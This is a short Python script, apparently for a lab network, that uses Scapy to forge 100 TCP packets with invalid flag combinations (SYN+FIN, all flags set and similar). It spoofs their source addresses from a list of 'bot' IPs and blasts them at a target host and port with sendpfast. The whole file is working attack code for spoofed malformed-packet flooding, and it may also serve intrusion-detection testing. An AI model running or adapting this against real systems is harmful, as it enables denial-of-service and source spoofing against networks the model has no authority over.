from scapy.all import *
import random
import time
import ipaddress

TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"

# Lista de combinações INVALIDAS de flags TCP
INVALID_TCP_FLAGS_LIST = [
    'SF',      # SYN + FIN
    'SR',      # SYN + RST
    'SFR',     # SYN + FIN + RST
    'SFP',     # SYN + FIN + PSH
    'FR',      # FIN + RST
    'SFRP',    # SYN + FIN + RST + PSH
    'FSRPAU',  # Todas as flags setadas
    'FPU',     # FIN + PSH + URG (comum no XMAS, mas pode ser usado aqui)
    'FPAU',    # FIN + PSH + ACK + URG (ainda mais estranho)
    'FSA',     # FIN + SYN + ACK
    'FSAU',    # FIN + SYN + ACK + URG
]

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_tcp_erroneous_flags_attack():
    bot_ips = load_bots(BOTFILE)
    numero_de_pacotes_enviados = 0
    lista_de_pacotes = []

    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        seq_num = random.randint(0, 4294967295)
        flags = random.choice(INVALID_TCP_FLAGS_LIST)
        tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags=flags, seq=seq_num, window=8192)

        packet = eth_layer / ip_layer / tcp_layer 
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == 100:
            break

    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído.")
    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")

if __name__ == "__main__":
    run_tcp_erroneous_flags_attack()

# sudo PYTHONPATH=$HOME/scapy python3 tcp_invalid_flags.py